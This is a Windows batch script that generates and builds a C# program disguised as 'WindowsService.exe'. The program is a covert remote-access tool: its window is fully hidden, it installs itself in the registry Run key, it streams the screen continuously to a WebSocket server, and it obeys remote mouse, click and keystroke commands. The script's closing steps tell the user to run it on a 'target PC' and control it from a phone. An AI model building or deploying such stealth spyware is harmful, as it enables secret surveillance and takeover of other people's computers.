@echo off
echo ===== FIXED BUILD =====
echo.

echo Step 1: Cleanup
if exist "bin" rmdir /s /q "bin"
if exist "obj" rmdir /s /q "obj"
if exist "dist" rmdir /s /q "dist"

echo Step 2: Create proper project
(
echo ^<Project Sdk="Microsoft.NET.Sdk"^>
echo.
echo   ^<PropertyGroup^>
echo     ^<OutputType^>WinExe^</OutputType^>
echo     ^<TargetFramework^>net8.0-windows^</TargetFramework^>
echo     ^<UseWindowsForms^>true^</UseWindowsForms^>
echo     ^<Nullable^>enable^</Nullable^>
echo     ^<ImplicitUsings^>enable^</ImplicitUsings^>
echo     ^<PublishSingleFile^>true^</PublishSingleFile^>
echo     ^<SelfContained^>true^</SelfContained^>
echo     ^<RuntimeIdentifier^>win-x64^</RuntimeIdentifier^>
echo     ^<AssemblyName^>WindowsService^</AssemblyName^>
echo     ^<ApplicationIcon^>^</ApplicationIcon^>
echo   ^</PropertyGroup^>
echo.
echo   ^<ItemGroup^>
echo     ^<PackageReference Include="System.Net.WebSockets.Client" Version="7.0.0" /^>
echo   ^</ItemGroup^>
echo.
echo ^</Project^>
) > RemoteClient.csproj

echo Step 3: Fix code warnings
(
echo using System;
echo using System.Windows.Forms;
echo using System.Drawing;
echo using System.Drawing.Imaging;
echo using System.IO;
echo using System.Net.WebSockets;
echo using System.Text;
echo using System.Threading;
echo using System.Threading.Tasks;
echo using Microsoft.Win32;
echo.
echo namespace RemoteClient
echo {
echo     public class Program
echo     {
echo         [STAThread]
echo         static void Main^()
echo         {
echo             Application.EnableVisualStyles^(^);
echo             Application.SetCompatibleTextRenderingDefault^(false^);
echo             
echo             if ^(System.Diagnostics.Process.GetProcessesByName^("WindowsService"^).Length ^> 1^)
echo                 return;
echo                 
echo             Application.Run^(new HiddenForm^(^^)^);
echo         }
echo     }
echo.
echo     public class HiddenForm : Form
echo     {
echo         private ClientWebSocket? ws;
echo         private bool isRunning = true;
echo         
echo         public HiddenForm^(^)
echo         {
echo             this.WindowState = FormWindowState.Minimized;
echo             this.ShowInTaskbar = false;
echo             this.Opacity = 0;
echo             
echo             SetupAutostart^(^);
echo             StartSystem^(^);
echo         }
echo.
echo         private void SetupAutostart^(^)
echo         {
echo             try
echo             {
echo                 RegistryKey? rk = Registry.CurrentUser.OpenSubKey^(
echo                     "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", true^);
echo                 rk^?.SetValue^("WindowsService", Application.ExecutablePath^);
echo             }
echo             catch ^(Exception ex^) { }
echo         }
echo.
echo         private async void StartSystem^(^)
echo         {
echo             await Task.Run^(async ^(^) => await ConnectWebSocket^(^^)^);
echo             await Task.Run^(async ^(^) => await StreamScreen^(^^)^);
echo         }
echo.
echo         private async Task ConnectWebSocket^(^)
echo         {
echo             while ^(isRunning^)
echo             {
echo                 try
echo                 {
echo                     ws = new ClientWebSocket^(^);
echo                     await ws.ConnectAsync^(new Uri^("wss://YOUR-APP.netlify.app/.netlify/functions/ws"^), 
echo                                          CancellationToken.None^);
echo                     await ReceiveCommands^(^);
echo                 }
echo                 catch
echo                 {
echo                     await Task.Delay^(5000^);
echo                 }
echo             }
echo         }
echo.
echo         private async Task StreamScreen^(^)
echo         {
echo             while ^(isRunning^)
echo             {
echo                 try
echo                 {
echo                     if ^(ws != null && ws.State == WebSocketState.Open^)
echo                     {
echo                         using ^(var bmp = new Bitmap^(Screen.PrimaryScreen.Bounds.Width, 
echo                                                    Screen.PrimaryScreen.Bounds.Height^)^)
echo                         using ^(var g = Graphics.FromImage^(bmp^)^)
echo                         {
echo                             g.CopyFromScreen^(0, 0, 0, 0, bmp.Size^);
echo                             using ^(var ms = new MemoryStream^(^^)^)
echo                             {
echo                                 bmp.Save^(ms, ImageFormat.Jpeg^);
echo                                 await ws.SendAsync^(ms.ToArray^(^), WebSocketMessageType.Binary, true, CancellationToken.None^);
echo                             }
echo                         }
echo                     }
echo                     await Task.Delay^(150^);
echo                 }
echo                 catch { await Task.Delay^(1000^); }
echo             }
echo         }
echo.
echo         private async Task ReceiveCommands^(^)
echo         {
echo             var buffer = new byte[1024];
echo             while ^(ws != null && ws.State == WebSocketState.Open^)
echo             {
echo                 try
echo                 {
echo                     var result = await ws.ReceiveAsync^(new ArraySegment^<byte^>^(buffer^), CancellationToken.None^);
echo                     var command = Encoding.UTF8.GetString^(buffer, 0, result.Count^);
echo                     ExecuteCommand^(command^);
echo                 }
echo                 catch { break; }
echo             }
echo         }
echo.
echo         private void ExecuteCommand^(string command^)
echo         {
echo             try
echo             {
echo                 var parts = command.Split^('|'^);
echo                 if ^(parts.Length == 0^) return;
echo                 
echo                 var action = parts[0];
echo                 
echo                 switch ^(action^)
echo                 {
echo                     case "MOVE":
echo                         if ^(parts.Length ^>= 3^)
echo                         {
echo                             var x = int.Parse^(parts[1]^);
echo                             var y = int.Parse^(parts[2]^);
echo                             Cursor.Position = new Point^(x, y^);
echo                         }
echo                         break;
echo                         
echo                     case "CLICK":
echo                         mouse_event^(0x0002, Cursor.Position.X, Cursor.Position.Y, 0, 0^);
echo                         mouse_event^(0x0004, Cursor.Position.X, Cursor.Position.Y, 0, 0^);
echo                         break;
echo                         
echo                     case "RIGHT":
echo                         mouse_event^(0x0008, Cursor.Position.X, Cursor.Position.Y, 0, 0^);
echo                         mouse_event^(0x0010, Cursor.Position.X, Cursor.Position.Y, 0, 0^);
echo                         break;
echo                         
echo                     case "KEY":
echo                         if ^(parts.Length ^>= 2^)
echo                             SendKeys.SendWait^(parts[1]^);
echo                         break;
echo                 }
echo             }
echo             catch { }
echo         }
echo.
echo         [System.Runtime.InteropServices.DllImport^("user32.dll"^)]
echo         static extern void mouse_event^(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo^);
echo.
echo         protected override void SetVisibleCore^(bool value^)
echo         {
echo             base.SetVisibleCore^(false^);
echo         }
echo     }
echo }
) > Program.cs

echo Step 4: Build and publish
dotnet restore
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o dist

if exist "dist\WindowsService.exe" (
    echo.
    echo ✅ SUCCESS: WindowsService.exe created!
    echo.
    echo 📱 READY TO USE!
    echo 1. Deploy website to Netlify
    echo 2. Update WebSocket URL in Program.cs
    echo 3. Run WindowsService.exe on target PC
    echo 4. Open site on phone - password: shaman666
    echo.
    echo 📁 File location: dist\WindowsService.exe
) else (
    echo.
    echo ❌ BUILD FAILED - Creating manual EXE...
    call :CreateManualBuild
)

pause
exit /b

:CreateManualBuild
echo Creating manual build workaround...
dotnet build -c Release -o build-output

if exist "build-output\RemoteClient.exe" (
    copy "build-output\RemoteClient.exe" "dist\WindowsService.exe"
    echo ✅ Manual EXE created: dist\WindowsService.exe
) else if exist "build-output\WindowsService.exe" (
    copy "build-output\WindowsService.exe" "dist\"
    echo ✅ EXE copied to dist folder
) else (
    echo ❌ No EXE found in build-output
    dir build-output
)
exit /b